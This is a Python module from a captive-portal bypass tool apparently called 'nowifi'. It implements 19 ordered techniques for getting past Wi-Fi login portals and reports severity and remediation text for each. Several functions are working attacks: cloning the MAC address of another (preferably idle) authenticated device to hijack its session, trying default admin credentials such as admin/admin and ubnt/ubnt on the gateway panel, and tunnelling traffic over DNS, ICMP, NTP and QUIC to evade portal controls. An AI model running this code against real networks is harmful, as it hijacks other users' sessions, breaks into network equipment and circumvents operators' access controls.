"""Bypass techniques: 19 ordered attempts to circumvent captive portal restrictions.

After a successful bypass, internet works system-wide (including browser) with
zero manual steps. All changes are temporary and restored when nowifi exits.

Techniques ordered most-powerful-first:
 1. IPv6 bypass          — portal only filters IPv4
 2. HTTPS/WS tunnel      — chisel through Cloudflare to your server
 3. CNA User-Agent spoof — portal auto-approves Apple CNA requests
 4. JS-only bypass       — portal enforces auth only in JavaScript
 5. HTTP CONNECT abuse   — tunnel through portal's transparent proxy
 6. MAC clone (idle)     — steal an inactive authenticated device's session
 7. MAC clone (any)      — steal any authenticated device's session
 8. DNS tunnel           — IP-over-DNS through your server
 9. ICMP tunnel          — IP-over-ping through your server
10. VPN on port 53       — WireGuard/OpenVPN on DNS port
11. Whitelist domain     — tunnel via whitelisted CDN domain
12. Session cookie replay— sniff and replay portal auth cookies
13. Portal default creds — try default admin passwords on portal
14. MAC rotate           — fresh random MAC for new session/quota
15. DHCP rotate          — new IP via DHCP release/renew cycle
16. QUIC tunnel          — Hysteria2 over UDP/443 (looks like HTTP/3)
17. CF Workers proxy     — serverless proxy via Cloudflare Workers
18. NTP tunnel           — data over UDP/123 (almost never blocked)
19. DoH tunnel           — DNS-over-HTTPS to bypass DNS interception
"""

from __future__ import annotations

import re
import subprocess
import time
from dataclasses import dataclass
from enum import Enum

from . import platform as platform_mac, tunnel
from .probe import ProbeResults


class BypassMethod(Enum):
    IPV6 = "ipv6_bypass"
    CHISEL_TUNNEL = "chisel_tunnel"
    CNA_SPOOF = "cna_useragent_spoof"
    JS_BYPASS = "js_only_bypass"
    HTTP_CONNECT = "http_connect_abuse"
    MAC_CLONE_IDLE = "mac_clone_idle"
    MAC_CLONE = "mac_clone"
    DNS_TUNNEL = "dns_tunnel"
    ICMP_TUNNEL = "icmp_tunnel"
    VPN_PORT53 = "vpn_port_53"
    WHITELIST_TUNNEL = "whitelist_domain"
    SESSION_REPLAY = "session_cookie_replay"
    PORTAL_DEFAULT_CREDS = "portal_default_creds"
    MAC_ROTATE = "mac_rotate"
    DHCP_ROTATE = "dhcp_rotate"
    QUIC_TUNNEL = "quic_tunnel"
    CF_WORKERS_PROXY = "cf_workers_proxy"
    NTP_TUNNEL = "ntp_tunnel"
    DOH_TUNNEL = "doh_tunnel"


class Severity(Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


@dataclass
class BypassResult:
    method: BypassMethod
    success: bool
    severity: Severity = Severity.INFO
    impact: str = ""
    details: str = ""
    remediation: str = ""
    tunnel_handle: tunnel.TunnelHandle | None = None


@dataclass
class AuditConfig:
    interface: str = "en0"
    tunnel_server: str = ""
    dns_tunnel_domain: str = ""
    icmp_tunnel_server: str = ""
    vpn_port53_server: str = ""
    stealth: bool = True
    cf_workers_url: str = ""
    quic_server: str = ""
    ntp_server: str = ""


def _has_internet() -> bool:
    """Quick check: do we have unrestricted internet right now?"""
    import requests
    try:
        r = requests.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5)
        return r.status_code == 204
    except Exception:
        return False


def _log(msg: str) -> None:
    """Print inline status during bypass attempts."""
    from rich.console import Console
    Console().print(f"    [dim]{msg}[/dim]")


def run_bypasses(probe_results: ProbeResults, config: AuditConfig) -> list[BypassResult]:
    """Try all 19 bypass techniques in order. Stop on first success."""
    results: list[BypassResult] = []

    # Inform user about server-dependent techniques
    has_server = bool(config.tunnel_server)
    if not has_server:
        _log("[dim]No tunnel server configured — 10 serverless techniques available.[/dim]")
        _log("[dim]For all 19: run `nowifi server create` first.[/dim]")

    techniques = [
        ("IPv6 bypass", lambda: _try_ipv6(probe_results)),
        ("HTTPS tunnel (chisel)", lambda: _try_chisel(config, probe_results)),
        ("CNA User-Agent spoof", lambda: _try_cna_spoof(probe_results)),
        ("JS-only bypass", lambda: _try_js_bypass(probe_results)),
        ("HTTP CONNECT abuse", lambda: _try_http_connect(probe_results, config)),
        ("MAC clone (idle)", lambda: _try_mac_clone(config.interface, idle_only=True)),
        ("MAC clone (any)", lambda: _try_mac_clone(config.interface, idle_only=False)),
        ("DNS tunnel", lambda: _try_dns_tunnel(config, probe_results)),
        ("ICMP tunnel", lambda: _try_icmp_tunnel(config, probe_results)),
        ("VPN port 53", lambda: _try_vpn_port53(config, probe_results)),
        ("Whitelist tunnel", lambda: _try_whitelist(probe_results, config)),
        ("Session cookie replay", lambda: _try_session_replay(config.interface)),
        ("Portal default creds", lambda: _try_default_creds(probe_results, config.interface)),
        ("MAC rotate", lambda: _try_mac_rotate(config.interface)),
        ("DHCP rotate", lambda: _try_dhcp_rotate(config.interface)),
        ("QUIC tunnel (Hysteria2)", lambda: _try_quic_tunnel(config, probe_results)),
        ("Cloudflare Workers proxy", lambda: _try_cf_workers(config, probe_results)),
        ("NTP tunnel", lambda: _try_ntp_tunnel(config, probe_results)),
        ("DoH tunnel", lambda: _try_doh_tunnel(config, probe_results)),
    ]

    for name, fn in techniques:
        _log(f"Trying: {name}...")
        try:
            r = fn()
        except Exception as e:
            r = BypassResult(
                method=BypassMethod.MAC_ROTATE,  # fallback enum
                success=False,
                details=f"Exception: {e}",
            )
        results.append(r)
        if r.success:
            _log(f"[green]SUCCESS: {name}[/green]")
            # For tunnel-based methods, set system proxy so browser works
            if r.tunnel_handle and r.tunnel_handle.active and r.tunnel_handle.local_port:
                _set_system_socks_proxy(config.interface, r.tunnel_handle.local_port)
            return results
        _log(f"[dim]Failed: {name}[/dim]")

    return results


# ---------------------------------------------------------------------------
# System proxy management — makes browser work without manual steps
# ---------------------------------------------------------------------------

def _set_system_socks_proxy(interface: str, port: int) -> None:
    """Set macOS system-wide SOCKS proxy so browser traffic routes through tunnel."""
    service = _get_network_service(interface)
    if not service:
        return
    try:
        subprocess.run(
            ["networksetup", "-setsocksfirewallproxy", service, "127.0.0.1", str(port)],
            capture_output=True, text=True, timeout=5,
        )
        subprocess.run(
            ["networksetup", "-setsocksfirewallproxystate", service, "on"],
            capture_output=True, text=True, timeout=5,
        )
    except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
        pass


def clear_system_socks_proxy(interface: str) -> None:
    """Remove system-wide SOCKS proxy (called by StateGuard on cleanup)."""
    service = _get_network_service(interface)
    if not service:
        return
    try:
        subprocess.run(
            ["networksetup", "-setsocksfirewallproxystate", service, "off"],
            capture_output=True, text=True, timeout=5,
        )
    except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
        pass


def _get_network_service(interface: str) -> str:
    """Get the macOS network service name for an interface (e.g., 'Wi-Fi' for en0)."""
    try:
        result = subprocess.run(
            ["networksetup", "-listallhardwareports"],
            capture_output=True, text=True, timeout=5,
        )
        lines = result.stdout.splitlines()
        for i, line in enumerate(lines):
            if f"Device: {interface}" in line and i > 0:
                m = re.search(r"Hardware Port:\s*(.+)", lines[i - 1])
                if m:
                    return m.group(1).strip()
    except (subprocess.TimeoutExpired, IndexError):
        pass
    return "Wi-Fi"  # fallback


# ---------------------------------------------------------------------------
# Technique implementations
# ---------------------------------------------------------------------------

def _try_ipv6(probes: ProbeResults) -> BypassResult:
    if not probes.ipv6.is_open:
        return BypassResult(method=BypassMethod.IPV6, success=False, details="No IPv6 connectivity")
    return BypassResult(
        method=BypassMethod.IPV6, success=True, severity=Severity.CRITICAL,
        impact="Full unrestricted IPv6 internet — bypasses all portal controls",
        details=probes.ipv6.details,
        remediation="Apply captive portal ACLs to IPv6. Filter RA/DHCPv6 or mirror IPv4 rules.",
    )


def _try_chisel(config: AuditConfig, probes: ProbeResults) -> BypassResult:
    """Try chisel tunnel — first via Cloudflare URL, then direct to any open port on server."""
    # Strategy 1: Via Cloudflare Tunnel (default URL, port 443)
    if probes.cloudflare.is_open or any(w.is_open for w in probes.whitelists):
        try:
            handle = tunnel.start_chisel_tunnel(config.tunnel_server)
            if tunnel.verify_tunnel_socks(handle.local_port):
                return BypassResult(
                    method=BypassMethod.CHISEL_TUNNEL, success=True, severity=Severity.CRITICAL,
                    impact="Full internet via system SOCKS proxy (auto-configured)",
                    details=f"HTTPS/WebSocket tunnel through {config.tunnel_server}",
                    remediation="Block WebSocket upgrades pre-auth. Inspect TLS SNI. Whitelist only portal domains.",
                    tunnel_handle=handle,
                )
            handle.stop()
        except tunnel.ToolNotFound as e:
            return BypassResult(method=BypassMethod.CHISEL_TUNNEL, success=False, details=f"Skipped: {e}")
        except Exception:
            pass  # Fall through to try direct ports

    # Strategy 2: Direct to server on any open port found during stealth scan
    open_server_ports = [p for p in probes.tunnel_server_ports if p.is_open]
    if open_server_ports:
        # Extract server IP from tunnel URL
        from urllib.parse import urlparse
        server_host = urlparse(config.tunnel_server).hostname or ""
        try:
            import socket as _sock
            server_ip = _sock.gethostbyname(server_host) if server_host else ""
        except Exception:
            server_ip = ""

        if server_ip:
            for port_result in open_server_ports:
                port = port_result.port
                # Try chisel on this port directly (HTTP, not HTTPS — behind portal)
                direct_url = f"http://{server_ip}:{port}"
                _log(f"  Trying chisel direct: {direct_url}")
                try:
                    handle = tunnel.start_chisel_tunnel(direct_url, timeout=8)
                    if tunnel.verify_tunnel_socks(handle.local_port):
                        return BypassResult(
                            method=BypassMethod.CHISEL_TUNNEL, success=True, severity=Severity.CRITICAL,
                            impact=f"Full internet via direct tunnel on port {port}",
                            details=f"Chisel direct to {server_ip}:{port} (bypassed Cloudflare, portal allows port {port})",
                            remediation=f"Block outbound port {port} for unauthenticated clients. Inspect non-standard port traffic.",
                            tunnel_handle=handle,
                        )
                    handle.stop()
                except Exception:
                    continue

    return BypassResult(method=BypassMethod.CHISEL_TUNNEL, success=False, details="No route to tunnel server (CF blocked, no direct ports open)")


def _try_cna_spoof(probes: ProbeResults) -> BypassResult:
    """Spoof Apple CNA / Wispr User-Agent — some portals auto-approve these."""
    import requests
    ua_list = [
        ("CaptiveNetworkSupport/1.0 wispr", "Apple CNA"),
        ("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) CaptiveNetworkSupport", "iOS CNA"),
        ("wispr", "Wispr generic"),
    ]
    for ua, name in ua_list:
        try:
            r = requests.get(
                "http://connectivitycheck.gstatic.com/generate_204",
                headers={"User-Agent": ua}, timeout=8, allow_redirects=False,
            )
            if r.status_code == 204:
                return BypassResult(
                    method=BypassMethod.CNA_SPOOF, success=True, severity=Severity.HIGH,
                    impact=f"Internet access via {name} User-Agent spoofing",
                    details=f"Portal auto-approved UA: {ua}",
                    remediation="Do not auto-approve CNA/Wispr User-Agents. Require explicit authentication for all clients.",
                )
        except Exception:
            continue
    return BypassResult(method=BypassMethod.CNA_SPOOF, success=False, details="No UA bypass found")


def _try_js_bypass(probes: ProbeResults) -> BypassResult:
    """Test if portal enforcement is JavaScript-only (no server-side block)."""
    import requests
    test_urls = [
        "http://httpbin.org/ip",
        "http://ifconfig.me/ip",
        "http://icanhazip.com",
    ]
    for url in test_urls:
        try:
            r = requests.get(url, timeout=8, allow_redirects=False, headers={"User-Agent": "curl/8.0"})
            if r.status_code == 200 and not any(p in r.text.lower() for p in ["login", "portal", "captive", "auth"]):
                return BypassResult(
                    method=BypassMethod.JS_BYPASS, success=True, severity=Severity.HIGH,
                    impact="Internet access — portal only enforces auth in JavaScript",
                    details=f"Direct HTTP request to {url} returned real content (no redirect)",
                    remediation="Enforce captive portal at the firewall/gateway level, not in client-side JavaScript.",
                )
        except Exception:
            continue
    return BypassResult(method=BypassMethod.JS_BYPASS, success=False, details="Portal has server-side enforcement")


def _try_http_connect(probes: ProbeResults, config: AuditConfig) -> BypassResult:
    """Test if portal's transparent proxy allows HTTP CONNECT to arbitrary hosts."""
    import socket
    gateway = platform_mac.get_gateway(config.interface)
    if not gateway:
        return BypassResult(method=BypassMethod.HTTP_CONNECT, success=False, details="No gateway")

    for proxy_port in [80, 8080, 3128]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((gateway, proxy_port))
            sock.sendall("CONNECT httpbin.org:443 HTTP/1.1\r\nHost: httpbin.org\r\n\r\n".encode())
            resp = sock.recv(4096).decode(errors="ignore")
            sock.close()
            if "200" in resp:
                return BypassResult(
                    method=BypassMethod.HTTP_CONNECT, success=True, severity=Severity.HIGH,
                    impact=f"HTTP CONNECT tunnel via gateway {gateway}:{proxy_port}",
                    details="Portal's transparent proxy allows CONNECT to arbitrary hosts",
                    remediation="Block HTTP CONNECT method for unauthenticated clients. Restrict proxy to whitelisted destinations only.",
                )
        except Exception:
            continue
    return BypassResult(method=BypassMethod.HTTP_CONNECT, success=False, details="CONNECT not available through gateway")


def _try_mac_clone(interface: str, idle_only: bool = False) -> BypassResult:
    """Clone MAC from authenticated device. idle_only=True prefers inactive devices."""
    method = BypassMethod.MAC_CLONE_IDLE if idle_only else BypassMethod.MAC_CLONE
    gateway = platform_mac.get_gateway(interface)
    if not gateway:
        return BypassResult(method=method, success=False, details="No gateway")

    our_mac = platform_mac.get_current_mac(interface)
    arp_table = platform_mac.get_arp_table()
    candidates: list[platform_mac.ArpEntry] = []

    for entry in arp_table:
        if entry.interface != interface:
            continue
        if entry.ip == gateway:
            continue
        if entry.mac.startswith("ff:ff") or entry.mac == "(incomplete)" or len(entry.mac) < 10:
            continue
        if entry.mac == our_mac:
            continue
        candidates.append(entry)

    if not candidates:
        return BypassResult(method=method, success=False, details="No devices in ARP table to clone")

    if idle_only:
        # Try to identify idle devices by doing a quick ping sweep
        # Devices that DON'T respond to ping are likely idle (screen off, sleeping)
        idle_candidates = []
        for c in candidates[:10]:  # limit to avoid slowness
            try:
                r = subprocess.run(
                    ["ping", "-c", "1", "-W", "1", c.ip],
                    capture_output=True, timeout=3,
                )
                if r.returncode != 0:  # no response = likely idle
                    idle_candidates.append(c)
            except Exception:
                idle_candidates.append(c)  # on error, assume idle
        if idle_candidates:
            candidates = idle_candidates
        else:
            return BypassResult(method=method, success=False, details="No idle devices found")

    # Try each candidate until one works
    for target in candidates[:5]:
        ok = platform_mac.set_mac(interface, target.mac)
        if not ok:
            continue
        time.sleep(1)
        platform_mac.renew_dhcp(interface)
        time.sleep(3)

        if _has_internet():
            return BypassResult(
                method=method, success=True, severity=Severity.CRITICAL,
                impact=f"Full internet by cloning {'idle ' if idle_only else ''}device MAC {target.mac} ({target.ip})",
                details=f"Portal uses MAC-only auth. {'Targeted idle device to avoid collision.' if idle_only else 'Direct clone.'}",
                remediation="Use 802.1X. Enable client isolation. Bind sessions to MAC+IP+DHCP lease. Detect duplicate MACs.",
            )

    # Restore if none worked (StateGuard will also do this, but be explicit)
    platform_mac.set_mac(interface, our_mac)
    platform_mac.renew_dhcp(interface)
    return BypassResult(method=method, success=False, details=f"Tried {min(len(candidates), 5)} MACs, none granted access")


def _try_dns_tunnel(config: AuditConfig, probes: ProbeResults) -> BypassResult:
    if not probes.dns.is_open:
        return BypassResult(method=BypassMethod.DNS_TUNNEL, success=False, details="DNS not open")
    if not config.dns_tunnel_domain:
        return BypassResult(method=BypassMethod.DNS_TUNNEL, success=False, details="No DNS tunnel domain configured (use --dns-domain)")
    try:
        handle = tunnel.start_dns_tunnel(config.dns_tunnel_domain)
        if tunnel.verify_tunnel_direct():
            return BypassResult(
                method=BypassMethod.DNS_TUNNEL, success=True, severity=Severity.HIGH,
                impact="Internet via DNS tunnel (50-500 Kbps)",
                details=f"IP-over-DNS through {config.dns_tunnel_domain}",
                remediation="Restrict DNS to portal resolvers. Block UDP/53 to external IPs. Inspect DNS for tunnel signatures.",
                tunnel_handle=handle,
            )
        handle.stop()
    except tunnel.ToolNotFound as e:
        return BypassResult(method=BypassMethod.DNS_TUNNEL, success=False, details=f"Skipped: {e}")
    except Exception as e:
        return BypassResult(method=BypassMethod.DNS_TUNNEL, success=False, details=f"Failed: {e}")
    return BypassResult(method=BypassMethod.DNS_TUNNEL, success=False, details="Tunnel connected but no internet")


def _try_icmp_tunnel(config: AuditConfig, probes: ProbeResults) -> BypassResult:
    if not probes.icmp.is_open:
        return BypassResult(method=BypassMethod.ICMP_TUNNEL, success=False, details="ICMP not open")
    if not config.icmp_tunnel_server:
        return BypassResult(method=BypassMethod.ICMP_TUNNEL, success=False, details="No ICMP server configured (use --icmp-server)")
    try:
        handle = tunnel.start_icmp_tunnel(config.icmp_tunnel_server)
        if tunnel.verify_tunnel_direct():
            return BypassResult(
                method=BypassMethod.ICMP_TUNNEL, success=True, severity=Severity.HIGH,
                impact="Internet via ICMP tunnel (100-300 Kbps)",
                details=f"IP-over-ICMP to {config.icmp_tunnel_server}",
                remediation="Block/rate-limit ICMP to external hosts. Allow only to gateway.",
                tunnel_handle=handle,
            )
        handle.stop()
    except tunnel.ToolNotFound as e:
        return BypassResult(method=BypassMethod.ICMP_TUNNEL, success=False, details=f"Skipped: {e}")
    except Exception as e:
        return BypassResult(method=BypassMethod.ICMP_TUNNEL, success=False, details=f"Failed: {e}")
    return BypassResult(method=BypassMethod.ICMP_TUNNEL, success=False, details="Tunnel connected but no internet")


def _try_vpn_port53(config: AuditConfig, probes: ProbeResults) -> BypassResult:
    """Try connecting WireGuard or OpenVPN on port 53 (DNS port, usually open)."""
    if not config.vpn_port53_server:
        return BypassResult(method=BypassMethod.VPN_PORT53, success=False, details="No VPN server configured (use --vpn-server)")
    # Check if port 53 UDP is open to the VPN server
    open_53 = any(p.port == 53 and p.is_open for p in probes.open_ports)
    if not open_53 and not probes.dns.is_open:
        return BypassResult(method=BypassMethod.VPN_PORT53, success=False, details="Port 53 not open")
    # Try WireGuard
    import shutil
    wg = shutil.which("wg-quick")
    if wg:
        try:
            subprocess.run(["sudo", "wg-quick", "up", "wg-nowifi"], capture_output=True, timeout=15)
            time.sleep(3)
            if _has_internet():
                return BypassResult(
                    method=BypassMethod.VPN_PORT53, success=True, severity=Severity.HIGH,
                    impact="Full internet via WireGuard VPN on port 53",
                    details=f"WireGuard to {config.vpn_port53_server}:53 — portal allows UDP/53",
                    remediation="Inspect UDP/53 traffic. Block non-DNS payloads on port 53. Use DNS response validation.",
                )
        except Exception:
            pass
    return BypassResult(method=BypassMethod.VPN_PORT53, success=False, details="WireGuard not available or connection failed")


def _try_whitelist(probes: ProbeResults, config: AuditConfig) -> BypassResult:
    """If any whitelisted domain is reachable, try to tunnel through it."""
    open_wl = [w for w in probes.whitelists if w.is_open]
    if not open_wl:
        return BypassResult(method=BypassMethod.WHITELIST_TUNNEL, success=False, details="No whitelisted domains reachable")
    # The chisel tunnel via Cloudflare already exploits this — report the finding
    domains = ", ".join(w.domain for w in open_wl)
    return BypassResult(
        method=BypassMethod.WHITELIST_TUNNEL, success=False, severity=Severity.MEDIUM,
        details=f"Whitelisted domains found ({domains}) but no dedicated tunnel server on them. Chisel via CF is the primary exploit.",
        remediation="Minimize whitelisted domains. Block WebSocket/tunneling on whitelisted destinations.",
    )


def _try_session_replay(interface: str) -> BypassResult:
    """Check ARP table for portal auth cookies in HTTP traffic (passive check only)."""
    # In a full implementation, this would sniff traffic for HTTP cookies
    # For the PoC, we check if the portal uses HTTP (not HTTPS) — if so, cookies are sniffable
    gateway = platform_mac.get_gateway(interface)
    if not gateway:
        return BypassResult(method=BypassMethod.SESSION_REPLAY, success=False, details="No gateway")
    import requests
    try:
        r = requests.get(f"http://{gateway}/", timeout=5, allow_redirects=True)
        if r.url.startswith("http://") and r.cookies:
            cookies = ", ".join(r.cookies.keys())
            return BypassResult(
                method=BypassMethod.SESSION_REPLAY, success=False, severity=Severity.HIGH,
                details=f"Portal serves cookies over HTTP (sniffable): {cookies}. Full exploit requires monitor mode packet capture.",
                remediation="Serve captive portal exclusively over HTTPS. Set Secure flag on all cookies.",
            )
    except Exception:
        pass
    return BypassResult(method=BypassMethod.SESSION_REPLAY, success=False, details="Portal uses HTTPS or no cookies found")


def _try_default_creds(probes: ProbeResults, interface: str = "en0") -> BypassResult:
    """Try default admin credentials on the portal management interface."""
    import requests
    gateway = platform_mac.get_gateway(interface)
    if not gateway:
        return BypassResult(method=BypassMethod.PORTAL_DEFAULT_CREDS, success=False, details="No gateway")

    admin_paths = ["/admin", "/login", "/manage", "/status", "/cgi-bin/luci", "/webfig/"]
    cred_pairs = [
        ("admin", "admin"), ("admin", "password"), ("admin", ""),
        ("root", "admin"), ("root", ""), ("ubnt", "ubnt"),
    ]

    for path in admin_paths:
        for proto in ["http", "https"]:
            url = f"{proto}://{gateway}{path}"
            try:
                r = requests.get(url, timeout=3, verify=False, allow_redirects=True)  # nosec B501 - intentional: probing LAN gateway admin panel (self-signed certs expected)
                if r.status_code == 200 and any(k in r.text.lower() for k in ["username", "password", "login"]):
                    # Found a login form — try default creds
                    for user, passwd in cred_pairs:
                        try:
                            r2 = requests.post(
                                url, data={"username": user, "password": passwd},
                                timeout=5, verify=False, allow_redirects=True,  # nosec B501 - intentional: LAN gateway admin panel
                            )
                            # Heuristic: if we get a different page (no "login" in response), creds worked
                            if r2.status_code == 200 and "login" not in r2.text.lower()[:500]:
                                return BypassResult(
                                    method=BypassMethod.PORTAL_DEFAULT_CREDS, success=True, severity=Severity.CRITICAL,
                                    impact=f"Portal admin access with {user}:{passwd} at {url}",
                                    details="Default credentials on portal management interface. Can whitelist MAC or disable portal.",
                                    remediation="Change default admin credentials. Restrict management interface to wired/VLAN access. Require MFA for admin.",
                                )
                        except Exception:
                            continue
            except Exception:
                continue

    return BypassResult(method=BypassMethod.PORTAL_DEFAULT_CREDS, success=False, details="No admin panel found or default creds failed")


def _try_mac_rotate(interface: str) -> BypassResult:
    """Fresh random MAC — new session, new quota, new time limit."""
    new_mac = platform_mac.generate_random_mac()
    ok = platform_mac.set_mac(interface, new_mac)
    if not ok:
        return BypassResult(method=BypassMethod.MAC_ROTATE, success=False, details="Need sudo for MAC change")
    time.sleep(1)
    platform_mac.renew_dhcp(interface)
    time.sleep(3)
    # This "succeeds" in the sense that you have a fresh session identity
    # Check if this alone bypasses the portal (unlikely, but some portals auto-approve new devices)
    if _has_internet():
        return BypassResult(
            method=BypassMethod.MAC_ROTATE, success=True, severity=Severity.HIGH,
            impact=f"Internet with fresh MAC {new_mac} — portal auto-approves new devices",
            details="No authentication required for new MAC addresses. Infinite sessions by rotating.",
            remediation="Require explicit authentication for all new devices. Don't auto-approve.",
        )
    return BypassResult(
        method=BypassMethod.MAC_ROTATE, success=False, severity=Severity.MEDIUM,
        details=f"Fresh MAC {new_mac} set but portal still requires auth. Use this for quota/time reset AFTER initial auth.",
        remediation="Portal correctly requires auth for new devices. Time/quota bypass still possible by re-authenticating with new MAC.",
    )


def _try_dhcp_rotate(interface: str) -> BypassResult:
    """Release and renew DHCP to get a new IP — some portals track by IP not MAC."""
    platform_mac.renew_dhcp(interface)
    time.sleep(3)
    if _has_internet():
        return BypassResult(
            method=BypassMethod.DHCP_ROTATE, success=True, severity=Severity.MEDIUM,
            impact="Internet after DHCP renewal — portal tracked by IP, not MAC",
            details="DHCP renewal assigned a new IP that bypassed portal state.",
            remediation="Track sessions by MAC+IP. Don't rely on IP alone for portal state.",
        )
    return BypassResult(method=BypassMethod.DHCP_ROTATE, success=False, details="DHCP renewal didn't bypass portal")


def _try_quic_tunnel(config: AuditConfig, probes: ProbeResults) -> BypassResult:
    """QUIC/Hysteria2 tunnel over UDP/443 — bypasses TCP-only portals."""
    # Check if UDP/443 is open (most portals only filter TCP)
    quic_open = getattr(probes, 'quic', None)
    if quic_open and not quic_open.is_open:
        return BypassResult(method=BypassMethod.QUIC_TUNNEL, success=False, details="UDP/443 (QUIC) blocked")

    server = config.quic_server or config.tunnel_server
    if not server:
        return BypassResult(method=BypassMethod.QUIC_TUNNEL, success=False, details="No QUIC server configured")

    try:
        handle = tunnel.start_quic_tunnel(server)
        if tunnel.verify_tunnel_socks(handle.local_port):
            return BypassResult(
                method=BypassMethod.QUIC_TUNNEL, success=True, severity=Severity.CRITICAL,
                impact="Full internet via QUIC tunnel (UDP/443 — looks like HTTP/3)",
                details=f"Hysteria2 QUIC tunnel to {server}. Portal only filters TCP, UDP passes through.",
                remediation="Inspect UDP/443 traffic. Block non-HTTP/3 QUIC connections for unauthenticated clients. Deploy QUIC-aware DPI.",
                tunnel_handle=handle,
            )
        handle.stop()
    except tunnel.ToolNotFound as e:
        return BypassResult(method=BypassMethod.QUIC_TUNNEL, success=False, details=f"Skipped: {e}")
    except Exception as e:
        return BypassResult(method=BypassMethod.QUIC_TUNNEL, success=False, details=f"Failed: {e}")
    return BypassResult(method=BypassMethod.QUIC_TUNNEL, success=False, details="QUIC tunnel connected but verification failed")


def _try_cf_workers(config: AuditConfig, probes: ProbeResults) -> BypassResult:
    """Cloudflare Workers as transparent proxy — no server needed, free tier."""
    if not config.cf_workers_url:
        return BypassResult(method=BypassMethod.CF_WORKERS_PROXY, success=False,
                           details="No CF Workers URL configured (use --cf-workers)")

    # Check if Cloudflare is reachable
    cf_open = probes.cloudflare.is_open or any(w.is_open and 'cloudflare' in w.domain.lower() for w in probes.whitelists)
    if not cf_open:
        return BypassResult(method=BypassMethod.CF_WORKERS_PROXY, success=False,
                           details="Cloudflare not reachable pre-auth")

    try:
        if tunnel.verify_cf_workers_proxy(config.cf_workers_url):
            return BypassResult(
                method=BypassMethod.CF_WORKERS_PROXY, success=True, severity=Severity.CRITICAL,
                impact="Full internet via Cloudflare Workers proxy (serverless, free)",
                details=f"CF Worker at {config.cf_workers_url} proxies requests. Traffic goes to trusted Cloudflare IPs.",
                remediation="Block access to *.workers.dev domains. Inspect HTTPS traffic to Cloudflare for proxy patterns. Consider blocking unknown Cloudflare subdomains.",
            )
    except Exception as e:
        return BypassResult(method=BypassMethod.CF_WORKERS_PROXY, success=False, details=f"Failed: {e}")
    return BypassResult(method=BypassMethod.CF_WORKERS_PROXY, success=False, details="CF Workers proxy not functional")


def _try_ntp_tunnel(config: AuditConfig, probes: ProbeResults) -> BypassResult:
    """NTP tunnel over UDP/123 — almost universally allowed."""
    ntp_open = getattr(probes, 'ntp', None)
    if ntp_open and not ntp_open.is_open:
        return BypassResult(method=BypassMethod.NTP_TUNNEL, success=False, details="NTP (UDP/123) blocked")

    server = config.ntp_server
    if not server:
        return BypassResult(method=BypassMethod.NTP_TUNNEL, success=False,
                           details="No NTP tunnel server configured (use --ntp-server)")

    try:
        handle = tunnel.start_ntp_tunnel(server)
        if tunnel.verify_tunnel_socks(handle.local_port):
            return BypassResult(
                method=BypassMethod.NTP_TUNNEL, success=True, severity=Severity.HIGH,
                impact="Internet via NTP tunnel (UDP/123, ~1-10 Kbps — slow but stealthy)",
                details=f"Data encoded in NTP extension fields to {server}. NTP is almost never blocked.",
                remediation="Restrict NTP to known time servers only. Inspect NTP packets for abnormal extension fields or payload sizes. Rate-limit NTP traffic per client.",
                tunnel_handle=handle,
            )
        handle.stop()
    except tunnel.ToolNotFound as e:
        return BypassResult(method=BypassMethod.NTP_TUNNEL, success=False, details=f"Skipped: {e}")
    except Exception as e:
        return BypassResult(method=BypassMethod.NTP_TUNNEL, success=False, details=f"Failed: {e}")
    return BypassResult(method=BypassMethod.NTP_TUNNEL, success=False, details="NTP tunnel connected but verification failed")


def _try_doh_tunnel(config: AuditConfig, probes: ProbeResults) -> BypassResult:
    """DNS-over-HTTPS tunnel — encrypted DNS to whitelisted endpoints."""
    doh_open = getattr(probes, 'doh', None)
    if doh_open and not doh_open.is_open:
        return BypassResult(method=BypassMethod.DOH_TUNNEL, success=False, details="DoH endpoints not reachable")

    try:
        handle = tunnel.start_doh_tunnel()
        if handle.active:
            return BypassResult(
                method=BypassMethod.DOH_TUNNEL, success=True, severity=Severity.HIGH,
                impact="DNS resolution via encrypted DoH (enables further tunneling)",
                details="DNS-over-HTTPS to Cloudflare/Google. Bypasses DNS interception by portal.",
                remediation="Block DoH endpoints (cloudflare-dns.com, dns.google) for unauthenticated clients. Deploy DoH-aware filtering.",
                tunnel_handle=handle,
            )
        handle.stop()
    except tunnel.ToolNotFound as e:
        return BypassResult(method=BypassMethod.DOH_TUNNEL, success=False, details=f"Skipped: {e}")
    except Exception as e:
        return BypassResult(method=BypassMethod.DOH_TUNNEL, success=False, details=f"Failed: {e}")
    return BypassResult(method=BypassMethod.DOH_TUNNEL, success=False, details="DoH tunnel did not start")
